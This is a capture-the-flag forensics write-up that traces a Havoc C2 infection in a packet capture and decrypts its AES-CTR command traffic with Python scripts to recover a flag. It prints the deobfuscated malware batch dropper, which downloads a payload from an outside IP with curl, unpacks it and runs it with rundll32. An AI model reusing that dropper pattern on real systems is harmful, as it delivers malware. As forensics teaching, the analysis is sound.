{%hackmd @themes/dracula %}

**Sorry for my english :(**
**If you see I am wrong, please correct it for me by commenting below, thank you**

# Forensics #

![](https://hackmd.io/_uploads/rys5XLz92.png)

> This challenge name should be ``No Star Where``, the challenge maker was so "cay".

The challenge gives us a packet capture file. We don't have to care all of packets in it.

![](https://hackmd.io/_uploads/rkeBBLMqn.png)

We just attend some packets like this. As you can see, the victim machine with IP address ``192.168.25.164`` had downloaded a zip file from ``140.238.217.117:4953``.

![](https://hackmd.io/_uploads/BJlmLUM92.png)

After exporting and unzipping it, I have two files. 

![](https://hackmd.io/_uploads/ByqIvIGc3.png)

I thought ``Security Baseline Discipline.docx`` had malicious macros in it, but after using olevba to analyse, it seems not a malware.

![](https://hackmd.io/_uploads/H14EOLGq3.png)

Checking file type of ``baseline.scr``, I got it is PE32 execute file.

![](https://hackmd.io/_uploads/HJDc_LG9h.png)

First, I disassembled it and saw the code, but its code is too complicated to analyse and this is not a reverse challenge. This is a forensics challenge.

So I ran it and used ``Process Hacker`` to see ``baseline.scr`` process.

It called child process ``cmd.exe`` and ``cmd.exe`` called its child processes ``conhost.exe`` and ``curl.exe``.

![](https://hackmd.io/_uploads/B1Wrq8Gc3.png)

After a while, it called run32dll.exe and displayed error messages.

![](https://hackmd.io/_uploads/BJg098fcn.png)

![](https://hackmd.io/_uploads/HkCysIf9h.png)

The ``cmd.exe`` process ran the batch file from ``Temp\50E1.tmp\50E2.tmp`` 

![](https://hackmd.io/_uploads/rkBtjLf9n.png)

I went to this location and saw the content of 50E3.bat file

![](https://hackmd.io/_uploads/HJo_n8zq2.png)

After deobfuscated it, I got:

```batch
@shift /0
@eCHo off
SEt R=JgigtGXzswbhmuSHIOA
cLs
@ecHO On
@shift /0
cd C:\Users\flarevm\AppData\Local\Temp
if exist C:\Users\flarevm\AppData\Local\Temp\bundau.dll (
rundll32.exe bundau.dll  Start
exit /b
) else (
curl.exe --url "http://140.238.217.117:4953/WINWORD.EXE" --output WINWORD.EXE
cd C:\Users\flarevm\AppData\Local\Temp
"C:\Program Files\7-Zip\7z.exe" x WINWORD.EXE -pNjg1NDM4NjY0YzQwNjc
rundll32.exe bundau.dll  Start
)
@echo off
set a = %%~i
set a = ~i"%%~i"
set a =
:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
```
This batch file checks if ``bundau.dll`` in ``Temp`` exists, It would execute ``rundll32.exe`` running ``bundau.dll``.
If not, it would download ``WINWORD.EXE`` which contains ``bundau.dll`` and unzip it using 7zip with password ``Njg1NDM4NjY0YzQwNjc``, then execute ``rundll32.exe bundau.dll  Start`` command.

![](https://hackmd.io/_uploads/rJ_6lDfc3.png)

If you don't know how to do dynamic analysis, you can drop it into virustotal to analyse, well, and it makes the challenge more simple.

![](https://hackmd.io/_uploads/Sy1gWgmqn.png)


You can export ``WINWORD.EXE`` from Wireshark.

![](https://hackmd.io/_uploads/HysclDMq2.png)

Like ``scr`` file, this file is so complicated to analyse, so I dropped it to Virustotal to check. It seems to be a Havoc demon.

![](https://hackmd.io/_uploads/ByYNbPz93.png)

![](https://hackmd.io/_uploads/HkoqZwfch.png)

Yeah, and Havoc is an open source C2 framework, so I can find its source and read.
https://github.com/HavocFramework/Havoc

In ``Transport.c``, we can easily see that C2 payload can transport via HTTP or SMB

![](https://hackmd.io/_uploads/r1E8C3z9n.png)

If we filter "http", we can see the command and result transfer between server and victim machine.

![](https://hackmd.io/_uploads/r16s03f53.png)

We can see package structure in ``Demon.c``

![](https://hackmd.io/_uploads/rklJWTzc2.png)

The first HTTP POST request packet from ``192.168.25.164`` to ``140.238.217.117`` is an initial packet. It contains AES Key, IV,...like package structure.

![](https://hackmd.io/_uploads/rkmd-6Gc3.png)

But, the package header is quite different than the package structure we've seen before. And it makes me a while to understand.

According to the package structure, in 16-byte first, 4-byte is SIZE, next 4-byte is magic value, next 4-byte is agent id and last 4-byte is command id right, and next is aes key right? But, AES key can not start with null character, so I thought it has some byte to obfuscated or something. 


```
0000   00 00 00 d2 de ad be ef 19 45 ac c4 00 00 00 00   .........E......
0010   00 00 00 63 d6 70 78 c4 42 24 e6 58 f4 02 ae 44   ...c.px.B$.X...D
0020   7a 10 12 06 e8 8e 20 ca 30 28 06 2c 66 8e 60 a4   z..... .0(.,f.`.
0030   10 82 fa b8 8a 34 bc e4 2c c4 6a 2a d0 a4 8e bc   .....4..,.j*....
0040   fe b0 aa 36 20 66 74 11 b3 47 89 8d 9e 4d 21 76   ...6 ft..G...M!v
0050   bf 18 87 e4 2b e2 c7 a9 f1 7a c6 b1 b5 c6 e2 0b   ....+....z......
0060   d9 6a 9f 34 20 83 fa 60 2c 4d 65 a2 47 02 5a b6   .j.4 ..`,Me.G.Z.
0070   f1 52 2a 62 52 2a d3 19 75 06 99 91 e1 e6 b5 52   .R*bR*..u......R
0080   b9 e0 3e 45 32 39 9c 06 9a 79 6a 27 55 fd f5 7b   ..>E29...yj'U..{
0090   e8 6d 7d 2c 92 32 0e e5 07 50 cd 7b 48 11 13 95   .m},.2...P.{H...
00a0   9d a9 34 be a2 dd 16 6d 90 88 04 6c 02 68 10 0d   ..4....m...l.h..
00b0   67 b3 c4 c3 11 9a 59 a3 96 2f 9f d7 ba 80 77 44   g.....Y../....wD
00c0   4d 0d 45 18 78 16 3d 03 cf 2d c4 a1 2f 8b ba bd   M.E.x.=..-../...
00d0   97 35 46 2a 02 16                                 .5F*..
```

But after reading the ``Package.c``, I understood why the package structure I found in ``Demon.c`` and the package structure I found in the packet are different. Yeah, Havoc C2 had a new update 3 months ago and what we saw in ``Demon.c`` is old. The new stucture of packet is Size -> Magic Value -> Agent ID -> Request ID -> Command ID.

![](https://hackmd.io/_uploads/BkEJITM93.png)

Base on it, I can extract aes key and iv from the initial packet.

The Key and IV are from the 20th byte, next 32-byte is Key and then 16-byte is IV. 

Key = ``d67078c44224e658f402ae447a101206e88e20ca3028062c668e60a41082fab8``
IV = ``8a34bce42cc46a2ad0a48ebcfeb0aa36``

Okay, we have Key and IV, but what kind of AES is it? I usually decrypt AES mode CBC and I thought this AES mode is CBC too but I was wrong. 

![](https://hackmd.io/_uploads/HJj4Zy7c2.png)

After a while struggle with this I read a source code and found AES Mode is CTR.

![](https://hackmd.io/_uploads/BktqGymqh.png)

![](https://hackmd.io/_uploads/rJShMkQ5h.png)

Let decrypt all packet.

For packet from the server (packet contain command), we have to decrypt data from 12nd byte.

``tshark -r capture.pcap -Y 'http && frame.len != 153 && frame.len != 206 && frame.len != 78' -T fields -e data.data > data2.txt``

```python
from Crypto.Cipher import AES
from Crypto.Util import Counter
from Crypto.Random import get_random_bytes

def aes_ctr_decrypt(key, iv, ciphertext):
    # Create an AES cipher object with a Counter mode
    ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)

    # Decrypt the ciphertext
    plaintext = cipher.decrypt(ciphertext)

    return plaintext

key = bytes.fromhex("d67078c44224e658f402ae447a101206e88e20ca3028062c668e60a41082fab8")
iv = bytes.fromhex("8a34bce42cc46a2ad0a48ebcfeb0aa36")

f = open("data2.txt", "r")
r = f.read()
r = r.split()

for i in r:
    cipher = bytes.fromhex(i)
    ciphertext = cipher[12:]

    plaintext = aes_ctr_decrypt(key, iv, ciphertext)
    print(plaintext.decode('latin-1'))
```

And the packet from implant (packet contain result), we have to decrypt data from 20th byte (except initial packet).

``tshark -r capture.pcap -Y 'http && frame.len != 153 && frame.len != 206 && frame.len != 78 && frame.len != 660 && frame.len != 111 && frame.len != 268' -T fields -e media.type > data.txt``

```python 
from Crypto.Cipher import AES
from Crypto.Util import Counter
from Crypto.Random import get_random_bytes

def aes_ctr_decrypt(key, iv, ciphertext):
    # Create an AES cipher object with a Counter mode
    ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)

    # Decrypt the ciphertext
    plaintext = cipher.decrypt(ciphertext)

    return plaintext

key = bytes.fromhex("d67078c44224e658f402ae447a101206e88e20ca3028062c668e60a41082fab8")
iv = bytes.fromhex("8a34bce42cc46a2ad0a48ebcfeb0aa36")

f = open("data.txt", "r")
r = f.read()
r = r.split()

for i in r:
    cipher = bytes.fromhex(i)
    ciphertext = cipher[20:]

    plaintext = aes_ctr_decrypt(key, iv, ciphertext)
    print(plaintext.decode('latin-1'))
```

**Command:**

![](https://hackmd.io/_uploads/HJyHskmq3.png)

**Result:**

![](https://hackmd.io/_uploads/r1osi1Xch.png)
![](https://hackmd.io/_uploads/SkuTjy7cn.png)
![](https://hackmd.io/_uploads/H1zRjkmq2.png)
![](https://hackmd.io/_uploads/BkX1hJmq2.png)

We can see the MZ file:

![](https://hackmd.io/_uploads/S1Fm3yQ53.png)

Retrieve it and load it into dnspy. We can see the function ``unhide`` that decript byte array below.

![](https://hackmd.io/_uploads/B1Xn6JQch.png)

I wrote a python script to decrypt it.

```python
import codecs

def unhide(key, _string):
    array = bytearray(len(_string))
    for i in range(len(_string)):
        array[i] = key[i % len(key)] ^ _string[i]
    return array.decode()

key = bytearray([
    156, 164, 143, 100, 219, 10, 34, 92,
    113, 212, 132, 229, 159, 196, 170, 56
])

_string = bytearray([212,240,205,31,239,85,80,104,31,167,180,136,232,240,216,11,195,144,227,19,239,115,81,3,6,166,183,209,244,241,245,80,168,210,191,7,166])

result = unhide(key, _string)
print(result)
```

And got the flag.

Flag: ``HTB{4_r4ns0mw4r3_4lw4ys_wr34k5_h4v0c}``

Reference: https://www.zscaler.com/blogs/security-research/havoc-across-cyberspace